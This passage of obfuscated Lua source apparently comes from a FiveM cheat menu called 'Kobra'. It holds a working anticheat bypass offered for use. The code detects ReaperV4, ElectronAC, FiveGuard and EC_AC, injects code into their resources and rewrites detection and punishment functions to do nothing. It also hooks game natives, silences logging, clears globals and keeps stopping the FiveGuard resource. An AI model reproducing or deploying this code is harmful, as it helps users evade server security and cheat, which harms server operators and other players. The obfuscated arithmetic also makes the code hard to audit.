17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v627))),color="0, 132, 255"},{key="Weapon",value=v16[v782] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v627))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v627))) * (8.6 -5) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v627))) and "Visible") or "Invisible" }},onSelect=function(v815) v15[v627]=v815 or false ;end};end end end for v467,v468 in pairs(v15) do local v469=false;for v532,v533 in ipairs(v286) do if (tonumber(v533.serverId)==tonumber(v467)) then v469=true;break;end end if  not v469 then v15[v467]=nil;end end v3=math.min(v3 or 1 ,math.max(1, #v284.tabs));local v288,v289=pcall(function() v283:UpdateElements(v5);end);if  not v288 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v289) );end end;v0.AssignListMenuActions=function(v290) if  not v4 then return;end for v470,v471 in ipairs(v4) do if ((v471.label=="Server") and v471.categories) then for v689,v690 in ipairs(v471.categories) do if ((v690.label=="List") and v690.tabs) then for v876,v877 in ipairs(v690.tabs) do if (v877.type=="button") then if (v877.label=="Select Everyone") then v877.onSelect=function() v0:SelectEveryone();end;elseif (v877.label=="Un-Select Everyone") then v877.onSelect=function() v0:UnselectEveryone();end;elseif (v877.label=="Clear Selection") then v877.onSelect=function() v0:ClearSelection();end;end end end end end end end end;CreateThread(function() while true do local v472=0;while true do if (v472==(611 -(258 + 353))) then Wait(3494 -(1382 + 612) );if (v0:InListMenu() and v1) then local v817,v818=pcall(function() v0:UpdateListMenu();end);if  not v817 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v818) );end end break;end end end end);Wait(1000);v0:AssignListMenuActions();local v101=nil;local v102=nil;local function v103() local v291=0 + 0 ;while true do if (v291==(0 + 0)) then for v691=0 + 0 ,GetNumResources() -1  do local v692=0;local v693;local v694;while true do if ((2 -1)==v692) then if (v694 and (string.find(v694,"https://electron-services.com") or string.find(v694,"Electron Services") or string.find(v694,"The most advanced fiveM anticheat"))) then local v1007=0 + 0 ;while true do if (v1007==(120 -(35 + 84))) then return v693;end if (0==v1007) then v101=v693;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v693 );v1007=216 -(75 + 140) ;end end end break;end if (v692==(0 -0)) then v693=GetResourceByFindIndex(v691);v694=LoadResourceFile(v693,"fxmanifest.lua");v692=1800 -(923 + 876) ;end end end return nil;end end end local function v104() local v292=0;while true do if (v292==0) then for v695=0 -0 ,GetNumResources() -1  do local v696=812 -(284 + 528) ;local v697;local v698;while true do if (v696==(1019 -(867 + 152))) then v697=GetResourceByFindIndex(v695);v698=GetNumResourceMetadata(v697,"client_script");v696=1107 -(709 + 397) ;end if (v696==(3 -2)) then for v979=36 -(21 + 15) ,v698-(1 -0)  do local v980=0 -0 ;local v981;while true do if (v980==0) then v981=GetResourceMetadata(v697,"client_script",v979);if (v981 and string.find(v981,"obfuscated")) then v102=v697;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v697 );return v697;end break;end end end break;end end end return nil;end end end v0.LoadBypass=function(v293) local v294=0 + 0 ;local v295;local v296;while true do if (v294==(8 -5)) then Wait(2491 -1491 );if (GetResourceState("ReaperV4")=="started") then local v784=0;while true do if (v784==(1 + 1)) then MachoHookNative(15349248000000000000,function(...) return false,0;end);MachoHookNative(18127728000000000000 -(97 + 38) ,function(...) return false,true;end);v784=3;end if ((80 -(52 + 28))==v784) then MachoInjectResource2(2,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000,function(...) return false,false;end);v784=1 + 0 ;end if (v784==(852 -(59 + 790))) then print("ReaperV4 Bypass Enabled");v293:Notify("info","Kobra","ReaperV4 Bypass Loaded",3000);break;end if ((1 + 0)==v784) then MachoHookNative(10181871000000000000,function(...) return false,1 + 2 ;end);MachoHookNative(12777102000000000000 -(467 + 473) ,function(...) return false,true;end);v784=9 -7 ;end end elseif (v101~=nil) then local v878=0;while true do if (v878==0) then v36("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(5 -3 ,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);break;end end elseif (v102~=nil) then local v1008=0;while true do if (v1008==0) then CreateThread(function() while true do local v1307=0;while true do if ((0 -0)==v1307) then MachoResourceStop(v102);print("^7[^5Kobra^7]: Stopped Resource: "   .. v102 );v1307=2 -1 ;end if (1==v1307) then Wait(790 + 1210 );break;end end end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1113=0 -0 ;local v1114;while true do if ((3 -2)==v1113) then v1114={"EC_AC"};for v1361=1 + 0 , #v1114 do local v1362=v1114[v1361];MachoInjectResource(v1362,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1050);end v1113=1 + 1 ;end if ((1 + 1)==v1113) then CreateThread(function() while true do local v1417=0;while true do if (v1417==(237 -(58 + 179))) then Wait(0 -0 );MachoResourceStop("EC_AC");break;end end end end);break;end if ((1253 -(677 + 576))==v1113) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1113=1;end end end v294=2 + 2 ;end if (v294==(3 -1)) then v103();v104();v294=223 -(88 + 132) ;end if (v294==(1 + 0)) then for v699,v700 in ipairs(v295) do if (v296==v700) then local v819=0;while true do if (v819==(0 -0)) then v293:Notify("error","Kobra","Bypass disabled for this server.",3000);return;end end end end v293:Notify("info","Kobra","Loading Anticheat Bypass...",3000);v294=2;end if (v294==4) then if (GetResourceState("WaveShield")=="started") then v0:Notify("error","Kobra","WaveShield Anticheat Found.",3000);elseif (GetResourceState("ReaperV4")=="started") then v0:Notify("error","Kobra","ReaperV4 Anticheat Found.",10523 -7523 );elseif (GetResourceState("ElectronAC")=="started") then v0:Notify("error","Kobra","ElectronAC Anticheat Found.",3291 -(12 + 279) );elseif (GetResourceState("FiniAC")=="started") then v0:Notify("error","Kobra","FiniAC Anticheat Found.",3000);end break;end if (v294==0) then v295={"216.146.24.88:30120","91.190.154.74:30120"};v296=GetCurrentServerEndpoint();v294=948 -(652 + 295) ;end end end;Wait(33 + 467 );v0:LoadBypass();